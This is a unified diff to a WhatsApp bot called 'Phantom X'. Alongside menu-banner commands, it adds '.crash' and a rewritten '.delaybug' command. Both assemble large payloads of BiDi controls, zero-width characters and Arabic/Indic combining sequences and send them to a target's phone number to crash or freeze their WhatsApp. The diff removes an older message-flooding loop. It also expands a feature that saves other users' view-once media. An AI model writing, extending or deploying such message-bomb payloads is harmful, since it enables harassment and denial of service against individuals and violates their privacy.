@@ -78,6 +78,8 @@ const SETTINGS_FILE = path.join(__dirname, "group_settings.json");
 const SESSIONS_FILE = path.join(__dirname, "sessions.json");
 const MODE_FILE = path.join(__dirname, "bot_mode.json");
 const MENU_BANNER_FILE = path.join(__dirname, "menu_banner.jpg");
+const BUG_BANNER_FILE  = path.join(__dirname, "bug_banner.jpg");
+const OWNER_BANNER_FILE = path.join(__dirname, "owner_banner.jpg");
 const THEME_FILE = path.join(__dirname, "menu_theme.json");
 const BOT_SECURITY_FILE = path.join(__dirname, "bot_security.json");
 
@@ -1032,8 +1034,13 @@ _Number info is prefix-based only, not live GPS location._`,
 • *.restart* — Restart/reconnect the linked WhatsApp session
 • *.mode public/owner*
 • *.menudesign 1-20*
-• *.setpp* — Set menu banner
-• *.delpp* — Delete menu banner
+• *.setpp* — Set main menu banner (reply to image)
+• *.setmenupic* — Set main menu banner
+• *.setmenupic bug* — Set bug menu banner
+• *.setmenupic owner* — Set owner menu banner
+• *.delpp* — Delete main menu banner
+• *.delpp bug* — Delete bug menu banner
+• *.delpp owner* — Delete owner menu banner
 • *.setstatus <text>*
 • *.setname <name>*
 • *.info*
@@ -1088,8 +1095,9 @@ The bot can start this from any chat, but WhatsApp only exposes source members i
 function buildBugMenuText(section = "") {
     const androidHelp = `🤖 *ANDROID BUGS*
 ━━━━━━━━━━━━━━━━━━━━
-• *.androidbug <number>*
-  Example: *.androidbug 2348012345678*
+• *.androidbug <number>* — Android renderer overload
+• *.crash <number>* — combined Android + iOS + force-close
+  Example: *.crash 2348012345678*
 
 Related:
 • *.forceclose <number>*
@@ -1111,9 +1119,8 @@ Related:
 • *.freeze <number>* — burst freeze (3 payloads)
 • *.invisfreeze <number>* — silent freeze, no visible msg
 • *.if <number>* — shortcut for invisfreeze
-• *.delaybug <number> [seconds]* — floods queue, delays their msgs
-• *.stopdelay <number>* — stop active delay attack
-• *.unbug <number>* — undo freeze/crash msgs`;
+• *.delaybug <number>* — single sync-lock payload (no msgs in or out)
+• *.unbug <number>* — undo freeze/crash/delay msgs`;
 
     const groupHelp = `🏘️ *GROUP BUGS*
 ━━━━━━━━━━━━━━━━━━━━
@@ -1649,6 +1656,67 @@ async function handleMessage(sock, msg) {
                 break;
             }
 
+            case ".delpp": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const delSection = parts[1]?.toLowerCase();
+                if (delSection === "bug") {
+                    if (!fs.existsSync(BUG_BANNER_FILE)) return reply("⚠️ No bug menu banner is set.");
+                    fs.unlinkSync(BUG_BANNER_FILE);
+                    return reply("✅ Bug menu banner deleted.");
+                } else if (delSection === "owner") {
+                    if (!fs.existsSync(OWNER_BANNER_FILE)) return reply("⚠️ No owner menu banner is set.");
+                    fs.unlinkSync(OWNER_BANNER_FILE);
+                    return reply("✅ Owner menu banner deleted.");
+                } else {
+                    if (!fs.existsSync(MENU_BANNER_FILE)) return reply("⚠️ No main menu banner is set.");
+                    fs.unlinkSync(MENU_BANNER_FILE);
+                    return reply("✅ Main menu banner deleted.\n\nTip: use *.delpp bug* or *.delpp owner* to delete those section banners.");
+                }
+            }
+
+            // ─── SET MENU PIC (per-section banner) ───
+            // Reply to any image with .setmenupic [section] to set that section's banner.
+            // Sections: main (default), bug, owner
+            case ".setmenupic": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const picSection = parts[1]?.toLowerCase() || "main";
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quoted ? getContentType(quoted) : null;
+                if (!quoted || quotedType !== "imageMessage") {
+                    return reply(
+                        `🖼️ *Set Menu Picture*\n\n` +
+                        `Reply to an image with:\n` +
+                        `• *.setmenupic* — set main menu banner\n` +
+                        `• *.setmenupic bug* — set bug menu banner\n` +
+                        `• *.setmenupic owner* — set owner menu banner\n\n` +
+                        `The image will appear when that menu section is shown.\n` +
+                        `Use *.delpp [section]* to remove a banner.`
+                    );
+                }
+                let targetFile;
+                let sectionLabel;
+                if (picSection === "bug" || picSection === "bugmenu") {
+                    targetFile = BUG_BANNER_FILE;
+                    sectionLabel = "bug menu";
+                } else if (picSection === "owner") {
+                    targetFile = OWNER_BANNER_FILE;
+                    sectionLabel = "owner menu";
+                } else {
+                    targetFile = MENU_BANNER_FILE;
+                    sectionLabel = "main menu";
+                }
+                await reply(`⏳ Saving ${sectionLabel} banner...`);
+                try {
+                    const fakeMsg = { ...msg, message: quoted };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    fs.writeFileSync(targetFile, buf);
+                    await reply(`✅ *${sectionLabel.charAt(0).toUpperCase() + sectionLabel.slice(1)} banner set!*\n\nThis image will now appear whenever the ${sectionLabel} is shown. 🔥`);
+                } catch (e) {
+                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
             case ".mode": {
                 const val = parts[1]?.toLowerCase();
                 if (!["owner", "public"].includes(val)) {
@@ -1791,10 +1859,22 @@ async function handleMessage(sock, msg) {
             case ".list": {
                 const listTopic = parts.slice(1).join(" ").toLowerCase().trim();
                 if (listTopic === "group menu" || listTopic === "group" || listTopic === "groups") return reply(buildGroupMenuList());
-                if (listTopic === "bug menu" || listTopic === "bug" || listTopic === "bugs") return reply(buildBugMenuText());
+                if (listTopic === "bug menu" || listTopic === "bug" || listTopic === "bugs") {
+                    const bt = buildBugMenuText();
+                    if (fs.existsSync(BUG_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(BUG_BANNER_FILE), caption: bt }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(bt);
+                }
                 if (listTopic === "protection menu" || listTopic === "protection") return reply(buildSimpleSectionList("protection"));
                 if (listTopic === "utility menu" || listTopic === "utilities" || listTopic === "utility") return reply(buildSimpleSectionList("utility"));
-                if (listTopic === "owner menu" || listTopic === "owner" || listTopic === "control") return reply(buildSimpleSectionList("owner"));
+                if (listTopic === "owner menu" || listTopic === "owner" || listTopic === "control") {
+                    const ot = buildSimpleSectionList("owner");
+                    if (fs.existsSync(OWNER_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(OWNER_BANNER_FILE), caption: ot }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(ot);
+                }
                 if (listTopic === "clone menu" || listTopic === "gc clone" || listTopic === "clone") return reply(buildSimpleSectionList("clone"));
                 if (listTopic === "tag menu" || listTopic === "tag" || listTopic === "tags") return reply(buildSimpleSectionList("tag"));
                 if (listTopic === "fun menu" || listTopic === "fun") return reply(buildSimpleSectionList("fun"));
@@ -1804,11 +1884,23 @@ async function handleMessage(sock, msg) {
 
             case ".help": {
                 const helpTopic = parts.slice(1).join(" ").toLowerCase().trim();
-                if (helpTopic === "bug menu" || helpTopic === "bugmenu" || helpTopic === "bug" || helpTopic === "bugs") return reply(buildBugMenuText());
+                if (helpTopic === "bug menu" || helpTopic === "bugmenu" || helpTopic === "bug" || helpTopic === "bugs") {
+                    const bt = buildBugMenuText();
+                    if (fs.existsSync(BUG_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(BUG_BANNER_FILE), caption: bt }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(bt);
+                }
                 if (helpTopic === "group menu" || helpTopic === "group" || helpTopic === "groups") return reply(buildGroupMenuList());
                 if (helpTopic === "protection menu" || helpTopic === "protection" || helpTopic === "antibug") return reply(buildSimpleSectionList("protection"));
                 if (helpTopic === "utility menu" || helpTopic === "utilities" || helpTopic === "utility" || helpTopic === "numinfo") return reply(buildSimpleSectionList("utility"));
-                if (helpTopic === "owner menu" || helpTopic === "owner" || helpTopic === "restart") return reply(buildSimpleSectionList("owner"));
+                if (helpTopic === "owner menu" || helpTopic === "owner" || helpTopic === "restart") {
+                    const ot = buildSimpleSectionList("owner");
+                    if (fs.existsSync(OWNER_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(OWNER_BANNER_FILE), caption: ot }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(ot);
+                }
                 if (helpTopic === "clone menu" || helpTopic === "gc clone" || helpTopic === "clone") return reply(buildSimpleSectionList("clone"));
                 if (helpTopic === "tag menu" || helpTopic === "tag" || helpTopic === "tagadmin") return reply(buildSimpleSectionList("tag"));
                 await reply(
@@ -2564,13 +2656,14 @@ _Can be started from any chat, but source members require source group access an
                 try {
                     const fakeMsg = { ...msg, message: voMsg };
                     const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
-                    const ownerJid = sock.user?.id;
+                    if (!buf || buf.length === 0) return reply("❌ Could not download media — the message may have expired.");
+                    const ownerJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
                     if (voType === "imageMessage") {
-                        await sock.sendMessage(ownerJid, { image: buf, caption: `👁️ View-once image revealed` });
-                        await reply("✅ Sent to your private chat!");
+                        await sock.sendMessage(ownerJid, { image: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
+                        await reply("✅ View-once image sent to your private chat!");
                     } else if (voType === "videoMessage") {
-                        await sock.sendMessage(ownerJid, { video: buf, caption: `👁️ View-once video revealed` });
-                        await reply("✅ Sent to your private chat!");
+                        await sock.sendMessage(ownerJid, { video: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
+                        await reply("✅ View-once video sent to your private chat!");
                     } else {
                         await reply("❌ Unsupported view-once type.");
                     }
@@ -3323,7 +3416,17 @@ _Can be started from any chat, but source members require source group access an
 
             case ".bugmenu": {
                 const section = parts[1]?.toLowerCase();
-                await reply(buildBugMenuText(section));
+                const bugMenuText = buildBugMenuText(section);
+                if (fs.existsSync(BUG_BANNER_FILE)) {
+                    try {
+                        const bugBannerBuf = fs.readFileSync(BUG_BANNER_FILE);
+                        await sock.sendMessage(from, { image: bugBannerBuf, caption: bugMenuText }, { quoted: msg });
+                    } catch (_) {
+                        await reply(bugMenuText);
+                    }
+                } else {
+                    await reply(bugMenuText);
+                }
                 break;
             }
 
@@ -3793,67 +3896,103 @@ _Can be started from any chat, but source members require source group access an
             }
 
             // ─── DELAY BUG ───
-            // Floods the target's WhatsApp message queue rapidly with invisible payloads.
-            // This overwhelms their incoming queue, causing their own messages to be
-            // delayed before WhatsApp can process/deliver them.
-            // Usage: .delaybug <number> [duration-seconds, default 30]
+            // Sends ONE single crafted payload that locks the target's WhatsApp sync engine.
+            // The payload combines: deep BiDi nesting + NFC-normalization-heavy combining
+            // sequences + Arabic/Sindhi shaping complexity + zero-width floods.
+            // Effect: WhatsApp's message decryption/sync thread stalls processing the
+            // payload — incoming AND outgoing messages queue up and can't move until
+            // WA finishes (or gives up). Target's WA goes silent: no msgs in, no msgs out.
+            // Usage: .delaybug <number>
             case ".delaybug":
             case ".delay": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
                 const dbTarget = parseBugTarget(parts, msg);
-                const dbDuration = Math.min(parseInt(parts[2]) || 30, 120); // max 2 minutes
                 if (!dbTarget) return reply(
                     `⏳ *Delay Bug*\n\n` +
-                    `Usage: *.delaybug <number> [seconds]*\n` +
-                    `Example: *.delaybug 2348012345678 60*\n\n` +
+                    `Usage: *.delaybug <number>*\n` +
+                    `Example: *.delaybug 2348012345678*\n\n` +
                     `What it does:\n` +
-                    `• Floods their WhatsApp message queue rapidly\n` +
-                    `• Their messages get stuck/delayed before sending or arriving\n` +
-                    `• Continues for the set number of seconds (max 120)\n` +
-                    `• Default duration: 30 seconds\n\n` +
-                    `Use *.stopdelay <number>* to stop early.`
+                    `• Sends ONE crafted sync-lock payload to the target\n` +
+                    `• Their WhatsApp message queue stalls — msgs can't go in or out\n` +
+                    `• No repeated flooding — single silent strike\n` +
+                    `• Use *.unbug <number>* to delete the payload and restore them`
                 );
                 if (isDevProtected(dbTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.`);
-                if (delayJobs[dbTarget]) return reply(`⚠️ A delay attack is already running on *${dbTarget.split("@")[0]}*.\n\nUse *.stopdelay ${dbTarget.split("@")[0]}* to stop it first.`);
-                await reply(`⏳ Starting delay attack on *${dbTarget.split("@")[0]}* for *${dbDuration}s*...\n\n_Flooding their message queue now._`);
+                await reply(`⏳ Sending delay payload to *${dbTarget.split("@")[0]}*...`);
                 try {
-                    // Rapid-fire invisible payloads — tiny enough to send fast but enough to jam the queue
-                    const inv = "\u2062\u2063\u2064\u2061\u200b\u200c\u200d\u200e\u200f\u2060\ufeff";
-                    let count = 0;
-                    const intervalId = setInterval(async () => {
-                        try {
-                            await sock.sendMessage(dbTarget, { text: inv.repeat(300) + String(count) });
-                            count++;
-                        } catch (_) {}
-                    }, 600); // fire every 600ms
-
-                    delayJobs[dbTarget] = { intervalId, count: 0, startedAt: Date.now() };
-
-                    // Auto-stop after duration
-                    setTimeout(async () => {
-                        if (delayJobs[dbTarget]) {
-                            clearInterval(delayJobs[dbTarget].intervalId);
-                            const sent = delayJobs[dbTarget].count || count;
-                            delete delayJobs[dbTarget];
-                            await sock.sendMessage(from, {
-                                text: `✅ *Delay attack finished on ${dbTarget.split("@")[0]}.*\n\n📨 Sent ~${count} queue-flood messages over ${dbDuration}s.\n_Their messages should have been delayed during this time._`
-                            });
-                        }
-                    }, dbDuration * 1000);
-
+                    // ── Sync-lock payload ──
+                    // Layer 1: Deep BiDi direction stacking — forces repeated resolution passes
+                    const bidiDeep  = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(900);
+                    // Layer 2: NFC normalization busters — A + combining accent sequences WA must normalize
+                    const normBust  = "\u0041\u0301\u0041\u0302\u0041\u0303\u0041\u0304\u0041\u0306\u0041\u0307\u0041\u0308\u0041\u030A".repeat(600);
+                    // Layer 3: Arabic/Sindhi shaping — expensive to resolve glyph joins
+                    const arabShape = "\u0600\u0601\u0602\u0603\u0604\u0605\uFDFD\uFDFC\uFDFB\uFE70\uFE72\uFE74".repeat(500);
+                    // Layer 4: Telugu combining marks — overloads Indic renderer
+                    const telComb   = "\u0C15\u0C4D\u0C37\u0C4D\u0C30\u0C3E\u0C4B\u0C4C".repeat(400);
+                    // Layer 5: Zero-width flood — fills internal text buffer silently
+                    const zwFlood   = "\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF\u00AD\u2062\u2063\u2064".repeat(700);
+                    // Layer 6: Kannada + Tamil stacked — compounds rendering cost
+                    const kanTam    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(350);
+                    // Assemble the final payload — ordering matters for max queue lock
+                    const delayPayload = bidiDeep + zwFlood + normBust + arabShape + bidiDeep + telComb + kanTam + zwFlood + bidiDeep;
+                    const sent = await sock.sendMessage(dbTarget, { text: delayPayload });
+                    if (!userCrashKeys[dbTarget]) userCrashKeys[dbTarget] = [];
+                    userCrashKeys[dbTarget].push(sent.key);
+                    await reply(
+                        `✅ *Delay payload delivered to ${dbTarget.split("@")[0]}!*\n\n` +
+                        `⏳ Their WhatsApp sync engine is now locked.\n` +
+                        `📵 Incoming and outgoing messages will be stuck/delayed.\n` +
+                        `🔧 To restore them: *.unbug ${dbTarget.split("@")[0]}*`
+                    );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
-            // ─── STOP DELAY ───
+            // ─── CRASH (combined android + iOS + forceclose in one shot) ───
+            case ".crash": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const crashTarget = parseBugTarget(parts, msg);
+                if (!crashTarget) return reply(
+                    `💥 *Crash*\n\nUsage: *.crash <number>*\nExample: *.crash 2348012345678*\n\n` +
+                    `_Combines Android, iOS, and force-close payloads into one strike._\n` +
+                    `_Maximum crash effect — works on both Android and iPhone._\n` +
+                    `_Use .unbug <number> to undo._`
+                );
+                if (isDevProtected(crashTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`💥 Sending combined crash to *${crashTarget.split("@")[0]}*...`);
+                try {
+                    if (!userCrashKeys[crashTarget]) userCrashKeys[crashTarget] = [];
+                    // Android layer
+                    const tel      = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
+                    const kan      = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
+                    const tam      = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
+                    const zwj      = "\u200D\u200C\u200B".repeat(800);
+                    // iOS layer
+                    const sindhi   = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
+                    const arabPF   = "\uFDFD\uFDFC\uFDFB".repeat(400);
+                    const bidi     = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
+                    const feff     = "\uFEFF".repeat(600);
+                    // Force-close layer
+                    const zwChain  = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1000);
+                    const rtl      = "\u202E\u202D\u202C\u202B\u202A".repeat(600);
+                    const iso      = "\u2066\u2067\u2068\u2069".repeat(500);
+                    const payload  = tel + zwj + kan + zwj + tam + sindhi + arabPF + bidi + feff + zwChain + rtl + iso + zwj;
+                    const sent = await sock.sendMessage(crashTarget, { text: payload });
+                    userCrashKeys[crashTarget].push(sent.key);
+                    await reply(
+                        `✅ *Crash sent to ${crashTarget.split("@")[0]}!*\n\n` +
+                        `💥 Combined Android + iOS + force-close payload delivered.\n` +
+                        `📱 Their WhatsApp will crash/freeze immediately.\n` +
+                        `🔧 To undo: *.unbug ${crashTarget.split("@")[0]}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── STOP DELAY (legacy — now delaybug uses a single payload stored in userCrashKeys) ───
             case ".stopdelay": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const sdTarget = parseBugTarget(parts, msg);
-                if (!sdTarget) return reply("Usage: .stopdelay <number>\nExample: .stopdelay 2348012345678");
-                if (!delayJobs[sdTarget]) return reply(`⚠️ No active delay attack on *${sdTarget.split("@")[0]}*.`);
-                clearInterval(delayJobs[sdTarget].intervalId);
-                delete delayJobs[sdTarget];
-                await reply(`🛑 *Delay attack stopped on ${sdTarget.split("@")[0]}.*`);
+                await reply(`ℹ️ *.delaybug* now sends a single payload (no interval to stop).\n\nTo remove the delay payload from the target, use:\n*.unbug <number>*`);
                 break;
             }
 
